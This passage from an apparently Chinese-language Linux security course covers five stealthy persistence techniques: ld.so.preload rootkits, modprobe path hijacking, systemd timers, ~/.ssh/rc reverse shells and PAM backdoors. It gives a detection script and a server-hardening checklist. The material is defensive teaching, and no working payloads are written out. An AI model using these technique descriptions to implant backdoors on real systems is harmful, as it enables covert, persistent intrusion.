忽略点1：/etc/ld.so.preload —— 最隐蔽的rootkit入口
  作用：Linux动态链接库预加载，优先于所有其他库加载
  攻击者手法：在这个文件中写入恶意.so库路径，系统上所有程序一启动就加载恶意代码
  检查：cat /etc/ld.so.preload
  → 正常情况下这个文件不存在或为空
  → 如果有内容→高度可疑！里面的.so文件需要用strings查看内容
  → 即使ls/ps/netstat也看不到恶意进程（因为它们自己也被hook了！）
  → 检测方法：用busybox（静态编译的，不受ld.so.preload影响）来检查
    busybox ls -la /etc/ld.so.preload
    busybox cat /proc/loadavg

忽略点2：/proc/sys/kernel/modprobe —— 内核模块自动加载后门
  作用：当内核需要加载模块时自动执行这里的路径
  攻击者手法：把modprobe路径改成恶意脚本→当系统需要加载某个内核功能时触发恶意脚本
  检查：cat /proc/sys/kernel/modprobe
  → 正常值：/sbin/modprobe
  → 如果被改成其他路径（如/tmp/.x/modprobe）→ 已植入后门

忽略点3：systemd定时器（.timer文件）—— 比crontab更隐蔽的定时任务
  作用：systemd的定时任务系统，比crontab更强大也更隐蔽
  攻击者手法：创建 /etc/systemd/system/backdoor.timer + backdoor.service
  检查：systemctl list-timers --all | grep -v "apt\|fstrim\|logrotate\|man\|motd\|phpsessionclean\|pld"
  → 关注任何不认识的定时器名称
  → 检查每个可疑定时器的.service文件内容

忽略点4：~/.ssh/rc 和 ~/.ssh/environment —— SSH登录自动执行
  作用：用户通过SSH登录时自动执行
  攻击者手法：在受害者用户的 ~/.ssh/rc 中写入反弹shell命令
  → 每次受害者登录SSH时都会被攻击者反弹一个shell
  检查：find /home /root -name "rc" -path "*/.ssh/*" -exec cat {} \;
  → 这个文件正常情况下不应该存在

忽略点5：PAM模块篡改 —— 在认证流程中插入后门
  作用：PAM(可插拔认证模块)控制Linux所有认证行为
  攻击者手法：在 /etc/pam.d/ 中修改或新增认证模块
  → 可以设置"万能密码"——任何账户输入特定密码都能通过认证
  → 可以记录所有用户的明文密码
  检查：rpm -Va | grep pam  (RHEL) 或 debsums -c libpam-modules (Debian)
  → 如果PAM模块被修改，完整性校验会报警
  → 检查 /etc/pam.d/ 中最近修改的文件
    find /etc/pam.d -type f -mtime -30 -ls
```

**检查上述5个点的统一脚本：**

```bash
#!/bin/bash
echo "===== 深度持久化检查 ====="
echo "[1] ld.so.preload检查"
if [ -f /etc/ld.so.preload ]; then
  echo "⚠️ 发现 /etc/ld.so.preload:"
  cat /etc/ld.so.preload
else
  echo "✓ 无ld.so.preload"
fi

echo "[2] modprobe路径检查"
mp=$(cat /proc/sys/kernel/modprobe 2>/dev/null)
if [ "$mp" != "/sbin/modprobe" ]; then
  echo "⚠️ modprobe被篡改: $mp"
else
  echo "✓ modprobe正常"
fi

echo "[3] systemd定时器检查"
systemctl list-timers --all 2>/dev/null | grep -v -E "apt|fstrim|logrotate|man|motd|phpsessionclean|pld|anacron|certbot" | tail -20

echo "[4] SSH rc文件检查"
find /home /root -name "rc" -path "*/.ssh/*" 2>/dev/null

echo "[5] PAM模块完整性检查"
rpm -Va 2>/dev/null | grep pam || debsums -c 2>/dev/null | grep pam || echo "  需要安装rpm或debsums工具"
find /etc/pam.d -type f -mtime -30 -ls 2>/dev/null

echo "===== 检查完成 ====="
```

---

## 🏗️ Linux安全加固的"实操Checklist"——不只是看懂，是能动手

以下是你可以直接在你管理的Linux服务器上执行的安全加固清单。每个操作前请先在测试环境验证，不要直接在生产环境操作：

```markdown
【加固1：SSH安全配置】（最低成本、最高收益）
文件：/etc/ssh/sshd_config

□ 禁止root直接SSH登录
  PermitRootLogin no
  → 先用普通用户SSH登录，再 sudo su - 切换到root
  → 攻击者必须同时破解"普通用户密码 + root密码"（或者用sudo）
  → 如果之前一直用root登录 → 先创建普通用户+配置sudo → 再改这个配置

□ 禁用密码登录，只用密钥认证
  PasswordAuthentication no
  PubkeyAuthentication yes
  → 之前：攻击者只需要猜密码 → 暴力破解门槛很低
  → 之后：攻击者必须有你电脑上的私钥文件 → 暴力破解几乎不可能
  → ⚠️ 务必先确保你的公钥已经添加到 ~/.ssh/authorized_keys → 再禁用密码！

□ 更改默认SSH端口（减少99%的自动扫描）
  Port 2222  # 或其他非标准端口
  → 不是"安全措施"（端口扫描会发现），但能减少大量自动攻击的噪音
  → 自动扫描器几乎只扫22端口 → 换个端口，你收到的暴力破解告警减少99%

□ 限制SSH登录用户
  AllowUsers alice bob  # 只允许alice和bob登录
  → 或者：AllowGroups sshusers → 只允许sshusers组的成员登录
  → 确保只有需要SSH管理的人才有SSH访问

□ 设置SSH空闲超时
  ClientAliveInterval 300  # 每5分钟发一次心跳
  ClientAliveCountMax 2    # 2次没响应就断开
  → 防止有人SSH登录后忘记退出，终端一直连着

【加固2：账户和密码策略】
□ 锁定或删除不必要的系统账户
  → 检查 /etc/passwd 中有哪些账户有shell（/bin/bash /bin/sh）
  → 把不需要登录的系统账户shell改为 /sbin/nologin 或 /bin/false
  → 特别注意：games, ftp, nobody 等账户默认不应有shell

□ 检查空密码账户
  awk -F: '($2 == "" || $2 == "!!") {print $1}' /etc/shadow
  → 任何空密码账户都是安全灾难

□ 设置密码过期策略
  chage -M 90 alice    # 密码90天后过期
  chage -m 7 alice     # 最少7天后才能改密码
  chage -W 7 alice     # 过期前7天开始警告
  → 在 /etc/login.defs 中设置全局默认值

□ 检查是否有UID=0的非root账户（隐藏的后门账户）
  awk -F: '($3 == 0) {print $1}' /etc/passwd
  → 正常情况下只应该有 root
  → 如果有其他账户UID=0 → 立刻排查！

【加固3：系统级安全配置】
□ 限制cron和at的使用
  → 创建 /etc/cron.allow 和 /etc/at.allow
  → 只有名单中的用户可以使用定时任务
  → 同时创建 /etc/cron.deny（拒绝名单）= 空文件（不拒绝任何人）
  → 这样：只有 allow 名单中的用户 + root 可以使用cron

□ 挂载 /tmp 为 noexec（禁止在/tmp执行程序）
  mount -o remount,noexec,nosuid /tmp
  → 或者加到 /etc/fstab 中永久生效
  → /tmp是攻击者最爱放恶意程序的地方 → noexec让攻击者的脚本无法执行
  → ⚠️ 注意：某些正常应用（如安装程序）依赖/tmp的可执行权限

□ 设置core dump限制（防止敏感信息泄露）
  echo "* hard core 0" >> /etc/security/limits.conf
  → 程序崩溃产生的core dump可能包含内存中的密码、密钥等敏感信息

□ 启用ASLR（地址空间布局随机化）
  echo 2 > /proc/sys/kernel/randomize_va_space
  → 让缓冲区溢出攻击更难成功（攻击者无法预测内存地址）

【加固4：日志和审计配置】
□ 确保关键日志不会被轻易清除
  chattr +a /var/log/auth.log    # 只能追加，不能删除
  chattr +a /var/log/syslog
  → chattr +a = append only模式 → 即使root也不能直接删除或清空

□ 配置auditd审计关键文件
  # 审计 /etc/passwd 和 /etc/shadow 的修改
  auditctl -w /etc/passwd -p wa -k passwd_changes
  auditctl -w /etc/shadow -p wa -k shadow_changes
  # 审计 /etc/sudoers 的修改
  auditctl -w /etc/sudoers -p wa -k sudoers_changes
  # 审计 SUID 文件的执行
  auditctl -a always,exit -F arch=b64 -S chmod -F a0=04777 -k suid_set
```

---

**📎 下节预告**：Day 4 将进入「全类型日志分析」，学会同时分析Web日志和系统日志，建立"攻击全景图"的思维。
